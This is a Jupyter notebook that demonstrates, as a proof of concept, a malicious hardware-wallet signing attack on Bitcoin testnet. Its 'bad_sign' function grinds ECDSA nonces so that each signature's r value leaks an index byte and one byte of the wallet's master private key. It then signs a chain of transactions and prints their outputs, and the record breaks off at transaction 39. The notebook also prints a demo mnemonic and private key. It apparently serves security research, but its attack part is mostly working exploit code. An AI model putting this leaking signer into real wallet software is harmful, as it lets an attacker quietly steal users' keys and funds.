# %%
from ipywidgets import FloatProgress
from IPython.display import display

from io import BytesIO
import random

# some elliptic curve functions from Jimmy Song's library
from ecc import *
from hd import *
from tx import *

# %% [markdown]
# # Hardware wallet

# %%
mnemonic = "deliver page pudding intact unable renew melt veteran insane tobacco dune napkin"
master = HDPrivateKey.from_mnemonic(mnemonic, testnet=True)
print("We will try to leak this key:")
print("xprv:", master.xprv())
print("Chain code:", master.chain_code.hex())
print("Private key:", master.private_key.secret.to_bytes(32, 'big').hex())
mpk = master.chain_code+master.private_key.secret.to_bytes(32, 'big')
print("\nHex representation:")
print(mpk.hex())

# child keys for receive and change addresses, according to BIP44, testnet
receive_keys = master.traverse(b"m/44'/1'/0'/0")
change_keys = master.traverse(b"m/44'/1'/0'/1")
# Out:
# We will try to leak this key:
# xprv: tprv8ZgxMBicQKsPdk5HkCWcUUZytAVPBnz7Qrw5x7RdgwyEVEaRtRyaQWF1A6M2nX6ypdcVeTvUtjMGWs3EDFJDeRHQsqCAp1Ad6xvwDmXfGeQ
# Chain code: 576d24362f1bf8a607dce491c9e2c602dcc4888c18a59ec0f085930e305b9181
# Private key: abd04002aeac340b047a02c9bf9fcea9d51000d07d89fc45a5334af4231e6194
#
# Hex representation:
# 576d24362f1bf8a607dce491c9e2c602dcc4888c18a59ec0f085930e305b9181abd04002aeac340b047a02c9bf9fcea9d51000d07d89fc45a5334af4231e6194

# %% [markdown]
# # Transactions
# We will need to inject private key information byte by byte into nonces of 64 transactions. It can be done in smaller / larger amounts of transactions depending on the size of injected information. As this is a proof of concept implementation efficiency and speed don't really matter, so let it be 64 transactions, in every signature 1 byte for index and 1 byte for actual private key data.
#
# Transaction tree will look as follows:
# ```
# external addr    → m/44'/1'/0'/0/0   - funding our hardware wallet
# m/44'/1'/0'/0/0  → external addr     - paying some amount
#                  → m/44'/1'/0'/1/0   - change amount
# m/44'/1'/0'/1/0  → external addr     - paying some amount
#                  → m/44'/1'/0'/1/1   - change amount
# ...
# m/44'/1'/0'/1/i  → external addr     - paying some amount
#                  → m/44'/1'/0'/1/i+1 - change amount
# ...
# m/44'/1'/0'/1/63 → external addr     - paying some amount
#                  → m/44'/1'/0'/1/64  - change amount
# ```
# After these transactions we will get the full private master key leaked and the attacker will be able to reconstruct it.

# %% [markdown]
# # Modified signing algorithm
# Instead of a normal signing algorithm where we were deriving deterministic k, we will start with deterministic k as usual and then increment k by one until we get a random point starting with `<i><mpk[i]>`:

# %%
# malicious signing
def bad_sign(z, pk, i):
    # use deterministic signatures
    k = pk.deterministic_k(z)
    # r is the x coordinate of the resulting point k*G
    R = k*G
    while ((R.x.num >> (248)) != (i%64)) or ((R.x.num >> (240))&0xFF != mpk[i%64]):
        k+=1
        R+=G # algorithm is not optimized => this operation is slow. Many optimizations can be done to speed up.
    r = R.x.num
    # remember 1/k = pow(k, N-2, N)
    k_inv = pow(k, N-2, N)
    # s = (z+r*secret) / k
    s = (z + r*pk.secret) * k_inv % N
    if s > N/2:
        s = N - s
    # return an instance of Signature:
    # Signature(r, s)
    return Signature(r, s)

def bad_sign_tx(tx, input_index, pk, i):
    tx_in = tx.tx_ins[input_index]
    # calculating hash to sign
    z = tx.sig_hash(input_index, SIGHASH_ALL)
    sig = bad_sign(z, pk, i)
    
    der = sig.der()
    # append the hash_type to der
    sig = der + bytes([SIGHASH_ALL])
    # calculate the sec
    sec = pk.point.sec(compressed=pk.compressed)
    # initialize a new script with [sig, sec] as the elements
    # change input's script_sig to new script
    tx_in.script_sig = Script([sig, sec])
    # return whether sig is valid using tx.verify_input
    return tx.verify_input(input_index)

# %% [markdown]
# # Signing transaction
#
# A transaction from external address to our wallet:
#
# https://live.blockcypher.com/btc-testnet/tx/82be4ae41e5f9cc5ecb43c369558999be3929816a95c1d7253577cfa1e5f0a66/

# %%
# private key controlling tx
mykey = receive_keys.child(0)
# receiving address
myaddress = mykey.address()
print(myaddress)
value_available = 7000000

# constructing an unsigned transaction to spend
# input
prev_tx = bytes.fromhex("82be4ae41e5f9cc5ecb43c369558999be3929816a95c1d7253577cfa1e5f0a66")
prev_index = 0
tx_in = TxIn(prev_tx, prev_index, b'', 0xffffffff)
tx_in._script_pubkey = Tx.get_address_data(myaddress)['script_pubkey']
tx_in._value = value_available
tx_ins = [ tx_in ]

destination_addr = "2N8rpE4YuhcYJV7pZiHgUmJSziJVBWf4CoD"
send_amount = 100000
fee = 1500
child_index = 0
change_key = change_keys.child(child_index)
change_address = change_key.address()
# outputs
tx_outs = [
    # sending some money to 2N8rpE4YuhcYJV7pZiHgUmJSziJVBWf4CoD
    TxOut(send_amount, Tx.get_address_data(destination_addr)['script_pubkey'].serialize()),
    # change goes back to the same address
    TxOut(value_available - send_amount - fee, Tx.get_address_data(change_address)['script_pubkey'].serialize())
]

tx = Tx(1, tx_ins, tx_outs, 0, testnet=True)
bad_sign_tx(tx, 0, mykey.private_key, child_index)
# Out:
# miYMX37jmdQA6ymQnZp2VBaaSK3119bhms
# True

# %%
# first transaction:
print("First hex transaction")
print(tx.serialize().hex())
print("\nr value of the signature:")
print(Signature.parse(tx.tx_ins[0].script_sig.elements[0][:-1]).r.to_bytes(32,'big').hex())
print("\ntx:", tx)
# Out:
# First hex transaction
# ...
#
# r value of the signature:
# 0057360015b25dc6eceeb44192e2476a1c7985ef44db03474f9703edb3ff1392
#
# tx: 5795b9ab35c0bc10f39f3d9a10193d3511225d17d89f36890f7adb8b7af440c7
# version: 1
# tx_ins:
# 82be4ae41e5f9cc5ecb43c369558999be3929816a95c1d7253577cfa1e5f0a66:0
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 6898500:1Mkd8ZEF2Sp4q8UY7wo4LUYvGprQji9GJY
#
# locktime: 0

# %%
tx.hash().hex()
# Out:
# '5795b9ab35c0bc10f39f3d9a10193d3511225d17d89f36890f7adb8b7af440c7'

# %% [markdown]
# Here you see first `00` is an index, `57` is the first byte of the private key

# %% [markdown]
# # Cycling over 64 transactions
#
# Checking two first bytes of the r value in the signatures
#
# from https://live.blockcypher.com/btc-testnet/tx/5795b9ab35c0bc10f39f3d9a10193d3511225d17d89f36890f7adb8b7af440c7/
#
# to https://live.blockcypher.com/btc-testnet/tx/dd39e8dbb028977829f5250725c66bd7370a1f2d8444819735dd7ead02b7557d/
#
# one can derive a master private key of the HD wallet.

# %%
for i in range(64):
    # incrementing keys etc.
    # tx -> prev_tx
    prev_tx = tx.hash()
    prev_index = 1
    mykey = change_key
    myaddress = change_address
    child_index += 1
    change_key = change_keys.child(child_index)
    change_address = change_key.address()
    value_available = value_available - send_amount - fee
    
    tx_in = TxIn(prev_tx, prev_index, b'', 0xffffffff)
    tx_in._script_pubkey = Tx.get_address_data(myaddress)['script_pubkey']
    tx_in._value = value_available
    tx_ins = [ tx_in ]

    destination_addr = "2N8rpE4YuhcYJV7pZiHgUmJSziJVBWf4CoD"
    # outputs
    tx_outs = [
        # sending some money to 2N8rpE4YuhcYJV7pZiHgUmJSziJVBWf4CoD
        TxOut(send_amount, Tx.get_address_data(destination_addr)['script_pubkey'].serialize()),
        # change goes back to the same address
        TxOut(value_available - send_amount - fee, Tx.get_address_data(change_address)['script_pubkey'].serialize())
    ]

    tx = Tx(1, tx_ins, tx_outs, 0, testnet=True)
    bad_sign_tx(tx, 0, mykey.private_key, child_index)
    print("\nTransaction", child_index)
    print("Hex transaction")
    print(tx.serialize().hex())
    print("\nr value of the signature:")
    print(Signature.parse(tx.tx_ins[0].script_sig.elements[0][:-1]).r.to_bytes(32,'big').hex())
    print("\ntx:", tx)
# Out:
# Transaction 1
# Hex transaction
# ...
#
# r value of the signature:
# 016d24c28dff49f70f1a3c146b2c48abaa1b4f5f576e0aa96c19a68ddfbd28cd
#
# tx: c9d3ad29cc04cbdc86fe9215e8b79dd35fb210b9b240614e5a21dde878f0d694
# version: 1
# tx_ins:
# 5795b9ab35c0bc10f39f3d9a10193d3511225d17d89f36890f7adb8b7af440c7:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 6797000:14wCmwRo98dUkeCpSRknBAAEGUCmHZy6Gg
#
# locktime: 0
#
#
# Transaction 2
# Hex transaction
# ...
#
# r value of the signature:
# 0224ec287fa4beb323894b67e5550de570e3b1961562e158ec0111adfd104c70
#
# tx: 142623c76c747c6a4b94b7d33c936b72cb5c29b6429531788e21ddcd2e8097bf
# version: 1
# tx_ins:
# c9d3ad29cc04cbdc86fe9215e8b79dd35fb210b9b240614e5a21dde878f0d694:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 6695500:1EjNFsQDh7yf26bhy758kJPAJdKDGf1efZ
#
# locktime: 0
#
#
# Transaction 3
# Hex transaction
# ...
#
# r value of the signature:
# 0336225945346f611bd05fc027e089be2d5a4eae0e030bebb6731c8b11fc8c3d
#
# tx: 53d1e816a0dad3595c9c488374749f61bd0fc1da76cd220b96e4e4cbf68b1063
# version: 1
# tx_ins:
# 142623c76c747c6a4b94b7d33c936b72cb5c29b6429531788e21ddcd2e8097bf:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 6594000:1PVxoS4aQWvMD2W1VFSpkZkCMTyDJA8d7E
#
# locktime: 0
#
#
# Transaction 4
# Hex transaction
# ...
#
# r value of the signature:
# 042f8bd955cd7d6f80d7a0dbef6c2f090d67395232ab7180e7e3b73b2c938c33
#
# tx: 3099f6374c061b7f48b16a12e9a7d3e022131e6fde4343c69404144fff8148c6
# version: 1
# tx_ins:
# 53d1e816a0dad3595c9c488374749f61bd0fc1da76cd220b96e4e4cbf68b1063:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 6492500:19zN2hmsBepH4kVEgJqutT1ZK5vwCoQk9j
#
# locktime: 0
#
#
# Transaction 5
# Hex transaction
# ...
#
# r value of the signature:
# 051b3831692a7e85efe563c1fab722e3a305004a1488688ea7e400c69989c5e5
#
# tx: 33901ea3314ea294d2ac490a7bb467d104cda1f8a98a4c9d48f70ea3b87ae7ff
# version: 1
# tx_ins:
# 3099f6374c061b7f48b16a12e9a7d3e022131e6fde4343c69404144fff8148c6:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 6391000:13QPoXHZx3iAd6yn19gSbHmGTxT7t4tTKh
#
# locktime: 0
#
#
# Transaction 6
# Hex transaction
# ...
#
# r value of the signature:
# 06f879a18bdd5682d76017329675197c62937ea55e6f9e267e5cfe6c55fd3df3
#
# tx: 17f51523ea2a9af586b0236722b86977c1325fc90986f6e67e4591e01f37824a
# version: 1
# tx_ins:
# 33901ea3314ea294d2ac490a7bb467d104cda1f8a98a4c9d48f70ea3b87ae7ff:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 6289500:1QGYQmimhF3FW3SVSPp4TVfnB2hvQaDKkH
#
# locktime: 0
#
#
# Transaction 7
# Hex transaction
# ...
#
# r value of the signature:
# 07a6b5840c8bba67eaebd9bf30185db8c7edb8c63d9b1df926953296b201ffbe
#
# tx: c1f6926f2c30158d875100c097be98394bbc6b389bbcc4c2e6267a648bf978a7
# version: 1
# tx_ins:
# 17f51523ea2a9af586b0236722b86977c1325fc90986f6e67e4591e01f37824a:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 6188000:15sJzfGJamLSYzMWYLGqxrh4jvAa9iwWpD
#
# locktime: 0
#
#
# Transaction 8
# Hex transaction
# ...
#
# r value of the signature:
# 0807c02e58ccaaa7facc1e1c60775b3d28e0fb0881d2949ca44f826b0d341cd6
#
# tx: 97f05b8a886783ec9aa35b838204b131191d3e40a01da1e4bddc57af4b9bc8eb
# version: 1
# tx_ins:
# c1f6926f2c30158d875100c097be98394bbc6b389bbcc4c2e6267a648bf978a7:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 6086500:1BSway1nA7q4AsKHddNjW2Rd3FEPQ4HG2A
#
# locktime: 0
#
#
# Transaction 9
# Hex transaction
# ...
#
# r value of the signature:
# 09dc7b7e5e813a42909a5e3da69070fa2d766370fe4e7ecb62864d2bcf016d54
#
# tx: d94da91980dac2e030e6de56bd4eed26b3771031e74b0a48e006db1847b80f7f
# version: 1
# tx_ins:
# 97f05b8a886783ec9aa35b838204b131191d3e40a01da1e4bddc57af4b9bc8eb:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 5985000:1LifWb4JypVLAJfj5c6zBTdfTkGNYdJmJm
#
# locktime: 0
#
#
# Transaction 10
# Hex transaction
# ...
#
# r value of the signature:
# 0ae49c998afd338b5a7be22cb12eece2b1fc43d3e8f124fe3c598846eec6b638
#
# tx: 006dd4ca43050ac974b67c48ae559f1c7bd945b9ea7b2f298748e9fd6330982a
# version: 1
# tx_ins:
# d94da91980dac2e030e6de56bd4eed26b3771031e74b0a48e006db1847b80f7f:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 5883500:1DfMjMa2Vr83WREMtu3mq2NkM92m4qDAEi
#
# locktime: 0
# Transaction 11
# Hex transaction
# ...
#
# r value of the signature:
# 0b9100354c43a5cd69f27c0e91c05252363ba6db98f8de187f13015d193da9de
#
# tx: c4217f2bf16c49b6aba234ae174aaac7272f43c451cbc93de519606ed3ac685f
# version: 1
# tx_ins:
# 006dd4ca43050ac974b67c48ae559f1c7bd945b9ea7b2f298748e9fd6330982a:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 5782000:1DFiy2TwnKbYCGTRLBuwxawTLRdy56y1fd
#
# locktime: 0
#
#
# Transaction 12
# Hex transaction
# ...
#
# r value of the signature:
# 0cc9ce075ab4b2cca69200ad6aadc6420150b4471254900a642fdf84f134fc13
#
# tx: 4eef56bbc11dd30f7462541ad99e1943785612182f3ec77d7ba2bdca67b3d7ea
# version: 1
# tx_ins:
# c4217f2bf16c49b6aba234ae174aaac7272f43c451cbc93de519606ed3ac685f:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 5680500:1GNUZYEKai8LiY1KDRAHkxEw3BEhDTTPZZ
#
# locktime: 0
#
#
# Transaction 13
# Hex transaction
# ...
#
# r value of the signature:
# 0de280f0d4ad2c7829a8335df62cc51243b129c5a8c7e9d6d3bfe20f4b40069d
#
# tx: 436b5739955c59925d619f84274b4574dcd9f7c14d1e7f7a30a645afeb445164
# version: 1
# tx_ins:
# 4eef56bbc11dd30f7462541ad99e1943785612182f3ec77d7ba2bdca67b3d7ea:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 5579000:17rr3VX58864S3PhwWAA52HLDKESC1cwub
#
# locktime: 0
#
#
# Transaction 14
# Hex transaction
# ...
#
# r value of the signature:
# 0ec65c8ba543f17f6b280ae2368e21e49adb0ae71b601221aa691f0fa386b6fa
#
# tx: dca0a6c0b1b5b4ddf3dcbd996dc7dc69ffa411a09058a59fdbc20d088254623c
# version: 1
# tx_ins:
# 436b5739955c59925d619f84274b4574dcd9f7c14d1e7f7a30a645afeb445164:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 5477500:1MUhYdiGfLXc44nHHjPhzJz9grGn97MPYQ
#
# locktime: 0
#
#
# Transaction 15
# Hex transaction
# ...
#
# r value of the signature:
# 0f0217db84562da60d92a2ff441b60c492bc68abac71822ce6d39b976b8c8f39
#
# tx: c1ed9652f4f40ef931028c4ce1f9d8292c56beb2f2777da9bf3199ab02c7727e
# version: 1
# tx_ins:
# dca0a6c0b1b5b4ddf3dcbd996dc7dc69ffa411a09058a59fdbc20d088254623c:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 5376000:1MGGVp6qUPubeU113bkaEgMbLsBPbST5eA
#
# locktime: 0
#
#
# Transaction 16
# Hex transaction
# ...
#
# r value of the signature:
# 10dce699bf409751d110feaf49652737bb42e9b6edf5a546bd453300ec9d7090
#
# tx: d331b5a1ca5036f2cc751b50574c946332612fcd9dc6e25dcedde227d2d63a06
# version: 1
# tx_ins:
# c1ed9652f4f40ef931028c4ce1f9d8292c56beb2f2777da9bf3199ab02c7727e:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 5274500:1BPJS4UkA6DhgGwePFH36sRX1YZcnFeSPc
#
# locktime: 0
#
#
# Transaction 17
# Hex transaction
# ...
#
# r value of the signature:
# 11c4952978cdb56f01f5f7f42695c2742ee626051dc17d06c87a4ddc8585d40a
#
# tx: 5d17a60ac8311f2f71d0d98e198932901bac0f55b64276b92ea3d23578f085f8
# version: 1
# tx_ins:
# d331b5a1ca5036f2cc751b50574c946332612fcd9dc6e25dcedde227d2d63a06:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 5173000:1LzBwrbiAVS2k97DrgL4ssECqKYmGaxZ9X
#
# locktime: 0
#
#
# Transaction 18
# Hex transaction
# ...
#
# r value of the signature:
# 128862131df7090ddd2222244b64d368eee0c4fbe9bd8fce96372a1b5b33b042
#
# tx: 179759aadfa1c0ff35aa17e7247d3df00c725cfa1a3b8c562f5b9f54b2cbacdf
# version: 1
# tx_ins:
# 5d17a60ac8311f2f71d0d98e198932901bac0f55b64276b92ea3d23578f085f8:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 5071500:15fR9Ld3F1SBLRjDNfJG93pyDMhKWa5yie
#
# locktime: 0
#
#
# Transaction 19
# Hex transaction
# ...
#
# r value of the signature:
# 138ccc8df8ee8078a0d2b537fa3b8d58413c0d530e3b80e515961ed8f8f5be41
#
# tx: db58c258b75e0249c0575ffc564f44718ef94ed9f12e629275962087c68b605f
# version: 1
# tx_ins:
# 179759aadfa1c0ff35aa17e7247d3df00c725cfa1a3b8c562f5b9f54b2cbacdf:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 4970000:1BVQuaqsKyRaBD3DHdGQbga9iddyuj8Sq6
#
# locktime: 0
#
#
# Transaction 20
# Hex transaction
# ...
#
# r value of the signature:
# 14189aab40686f7711d3d5370d0f008dcc962662b808f0af50847ab5c352edb7
#
# tx: c752db787e49f732a21e30f085f6a75bc01c6c4d120534884423ce2c78202ff0
# version: 1
# tx_ins:
# db58c258b75e0249c0575ffc564f44718ef94ed9f12e629275962087c68b605f:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 4868500:1DCvYFFDtiF1CK4VuSmMmQC6zGw4d1wCid
#
# locktime: 0
# Transaction 21
# Hex transaction
# ...
#
# r value of the signature:
# 15a5fb4ae9a12d7bc85271ea52fc98133c273ffb6ea521dc8fae95fc8ae307da
#
# tx: 6def6a0b71919aa6f7e6078a6f018ec4df9da0340eb69e483319087828723b4b
# version: 1
# tx_ins:
# c752db787e49f732a21e30f085f6a75bc01c6c4d120534884423ce2c78202ff0:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 4767000:14KXSg24Uihg9JWJwizGDKtwWZhNoWtJJ8
#
# locktime: 0
#
#
# Transaction 22
# Hex transaction
# ...
#
# r value of the signature:
# 169e5a7d4a57a498d2215a1a639156ccae85cc12664397a32f884b31a88b2bf2
#
# tx: 935006702ee1ea6f11bd08c7ebf51a09dbab9f73822ac57fab0a8fbe28bc3b69
# version: 1
# tx_ins:
# 6def6a0b71919aa6f7e6078a6f018ec4df9da0340eb69e483319087828723b4b:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 4665500:1D9hiTzcHczbhWGiwAzrsk3ZbFyR4JLpat
#
# locktime: 0
#
#
# Transaction 23
# Hex transaction
# ...
#
# r value of the signature:
# 17c029a368b7ba74435db7db5304ed3502aadd981250932b76941cd0f335d6fb
#
# tx: eb540e75006e7efaa452c807bceb146c491c8aab0d5b2ce63975353f8f3929ef
# version: 1
# tx_ins:
# 935006702ee1ea6f11bd08c7ebf51a09dbab9f73822ac57fab0a8fbe28bc3b69:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 4564000:1CwrnqHYhAnKNuiR22YqYxA5hq8WJsgi55
#
# locktime: 0
#
#
# Transaction 24
# Hex transaction
# ...
#
# r value of the signature:
# 18f0e99cf2a71b463eb058603f3be1e21f3394a2661e8ae7abb7ee6b499f0c15
#
# tx: 04e6555467ad391b002c3b0df23e864b7b0b66e3599ce0edb224f6d23a175f8f
# version: 1
# tx_ins:
# eb540e75006e7efaa452c807bceb146c491c8aab0d5b2ce63975353f8f3929ef:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 4462500:17FAfWjz7YoKBtrmbPZihZddbcTEzZ7nYb
#
# locktime: 0
#
#
# Transaction 25
# Hex transaction
# ...
#
# r value of the signature:
# 1985357f8ce71eb8764d61c87b763901a34d09b41bcbccf7f70e0403066e7061
#
# tx: bc1d65d2ea59d740c6ef577a76c4963eb983c342321b5c52b3244966d4bbadcd
# version: 1
# tx_ins:
# 04e6555467ad391b002c3b0df23e864b7b0b66e3599ce0edb224f6d23a175f8f:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 4361000:14qM7RJMDgkcCtxqsksnC7NKDZKkpTLGNt
#
# locktime: 0
#
#
# Transaction 26
# Hex transaction
# ...
#
# r value of the signature:
# 1a93f901285bfb3dab9e9d166aeabddf9921834b66a052724205f62afc442714
#
# tx: ae74563077dfc93ed437b30a3c10af6a392370623fb0e2de5e213808ae8c861c
# version: 1
# tx_ins:
# bc1d65d2ea59d740c6ef577a76c4963eb983c342321b5c52b3244966d4bbadcd:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 4259500:1FqJaWwqYFKNzayfqqZYfeg94BwasNHvFg
#
# locktime: 0
#
#
# Transaction 27
# Hex transaction
# ...
#
# r value of the signature:
# 1b0ed8e255a3fc861fa0d6f0d82cd171be640414ac894e2c3ee3b6b2c6be0dfb
#
# tx: e6ec7f11b14bf8d39eb53c7550de44950ea6f8bf492ac968582b1276e3dd096c
# version: 1
# tx_ins:
# ae74563077dfc93ed437b30a3c10af6a392370623fb0e2de5e213808ae8c861c:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 4158000:17DRZR3GT4bGZJF3F8h2Zng772DFvZbMmg
#
# locktime: 0
#
#
# Transaction 28
# Hex transaction
# ...
#
# r value of the signature:
# 1c30f609cb13e679d859d787b2a42e94097ebaf6d1921b55455687f57574a61b
#
# tx: 24ee6c482fab08a82d2fdead8b636588e3c240434d60b184bea4dc3b121cce85
# version: 1
# tx_ins:
# e6ec7f11b14bf8d39eb53c7550de44950ea6f8bf492ac968582b1276e3dd096c:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 4056500:1DuY2NHwkyQxR2UmyxUWDNnWw4UKKe9nVA
#
# locktime: 0
#
#
# Transaction 29
# Hex transaction
# ...
#
# r value of the signature:
# 1d5bdb56680f42de5d41c5631b49bc9e350e2aecca555052e8ac3aef044ddd0a
#
# tx: 196bbd937f8957a93b1374576bffb17aa28fefbb5d7f2b10c4533fe1011457c0
# version: 1
# tx_ins:
# 24ee6c482fab08a82d2fdead8b636588e3c240434d60b184bea4dc3b121cce85:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 3955000:1LhDmjDRNUHSX5ujLYpjcpXm2L73YKoCAr
#
# locktime: 0
#
#
# Transaction 30
# Hex transaction
# ...
#
# r value of the signature:
# 1e91c3cc1d194d92b7697d1c5b04c1658c22d8a96368760ee1e5fc3ca028309f
#
# tx: 5ce3e4e460a7b08dfb1874bd3769eea13adc0f98ca947a026a4ef5dfd2ebd46f
# version: 1
# tx_ins:
# 196bbd937f8957a93b1374576bffb17aa28fefbb5d7f2b10c4533fe1011457c0:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 3853500:1JPteBpm1L9y4xyUkVyANaVnfFZU8zFYR3
#
# locktime: 0
# Transaction 31
# Hex transaction
# ...
#
# r value of the signature:
# 1f81bffefa8173b3a9ed805e1a2f0a03293ae3227feb58ebe193d1d3e355812f
#
# tx: 0f156f2aee99af2f51e37c6006d4fdb6b52e4a961651abb6da5b8b69daa5d7fc
# version: 1
# tx_ins:
# 5ce3e4e460a7b08dfb1874bd3769eea13adc0f98ca947a026a4ef5dfd2ebd46f:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 3752000:13iRXUpnBk3xEeqdoayg6ZaietcERfTHyG
#
# locktime: 0
#
#
# Transaction 32
# Hex transaction
# ...
#
# r value of the signature:
# 20abe7ee6d8a124424fcedaf523b0f957ff3dc2272215187fe9fb400e659ba70
#
# tx: 268fc2000bad87154a4a67360385a50a4e5e1dae62e7fb3283d594d8e533c067
# version: 1
# tx_ins:
# 0f156f2aee99af2f51e37c6006d4fdb6b52e4a961651abb6da5b8b69daa5d7fc:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 3650500:12kYnWVgG286zkrS3ropKcHXkAPQPC1hRa
#
# locktime: 0
#
#
# Transaction 33
# Hex transaction
# ...
#
# r value of the signature:
# 21d0baa53723cbdfcff9f0845dd8304a845af1b15152c4fff5e4bb09c550e224
#
# tx: 34157a560575f8defec3a9c9352d6f3b2e597f1b88d570d65573fa90fb900a94
# version: 1
# tx_ins:
# 268fc2000bad87154a4a67360385a50a4e5e1dae62e7fb3283d594d8e533c067:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 3549000:12rTCi9L9KxUvnDkFGSUQFh9FqWFSCqVrg
#
# locktime: 0
#
#
# Transaction 34
# Hex transaction
# ...
#
# r value of the signature:
# 22403ea885baaae9df1c3b032a5f70cd1536dbe0cf6db04536a6086ba4cba049
#
# tx: 5d39ec30af7d4e29ecaa05095419ee1f5f09566d9f751cb37e8622105162dc02
# version: 1
# tx_ins:
# 34157a560575f8defec3a9c9352d6f3b2e597f1b88d570d65573fa90fb900a94:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 3447500:1NJA5GmhMyKcCSEX1Ud7BKYMoub9VbHviY
#
# locktime: 0
#
#
# Transaction 35
# Hex transaction
# ...
#
# r value of the signature:
# 2302e847d42f21bad0d23e6d997f188f7c5303dec49214a9e0fa4f69ea88c60f
#
# tx: fe7ca09858b6f471a7f0a1a8a971df260576bf2ac62850c5ae2c76f33296d1cd
# version: 1
# tx_ins:
# 5d39ec30af7d4e29ecaa05095419ee1f5f09566d9f751cb37e8622105162dc02:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 3346000:1DPeg1AV5hnDCvkqCDsARz4SuRyvmMzV5j
#
# locktime: 0
#
#
# Transaction 36
# Hex transaction
# ...
#
# r value of the signature:
# 24ae52585c92d4d621179c75d28ae1c84e90a64218dd29ede50802f6c25f9b7d
#
# tx: 590251e93926eb1db3a2b8fe4b928daffc390ab9e556d9aaaf898dc0359aeb07
# version: 1
# tx_ins:
# fe7ca09858b6f471a7f0a1a8a971df260576bf2ac62850c5ae2c76f33296d1cd:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 3244500:1Ed1quHiav7YRbW4naYAVvNq4Zvos4wWgD
#
# locktime: 0
#
#
# Transaction 37
# Hex transaction
# ...
#
# r value of the signature:
# 25ac0f82068390f553b929bb2b8c0ef1e4cf3f8fb41c1621eac16fb0291203b9
#
# tx: 9b9d107d45e5ab04788a78f96bfb87e2d883cfa38b428874add9bbc4b1f9e446
# version: 1
# tx_ins:
# 590251e93926eb1db3a2b8fe4b928daffc390ab9e556d9aaaf898dc0359aeb07:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 3143000:1LRLqo3QsiRGyvxajpfpaT83NFKyUTKqV4
#
# locktime: 0
#
#
# Transaction 38
# Hex transaction
# ...
#
# r value of the signature:
# 26347a01f9ffd8bd974d8af22f3c2cf9bea91e2e06d8d635c05a911529665a64
#
# tx: 20b5e91bfd30ed65c5cc563a3c42608f42a81db50d86c5506e09ae3814a4e3c7
# version: 1
# tx_ins:
# 9b9d107d45e5ab04788a78f96bfb87e2d883cfa38b428874add9bbc4b1f9e446:1
#
# tx_outs:
# 100000:1GcbEn8SYFiaCAVav4Q1ij6oMRzJ9h4feq
# 3041500:1PzWENiseCgdYRsAF2FNSJ3gnEozot5EvR
#
# locktime: 0
#
#
# Transaction 39
# Hex transaction
# ...
#
# r value of the signature:
# 270bbd0bd9c213e59902be451d053cc83e92b94f5b94fb3ca4e370f481df472f
#
# tx: 9df4b7cbd57bd85a486005d2cc89996a798c1b9b281efc952c568ec7aa82f3b3
# version: 1
# tx_ins:
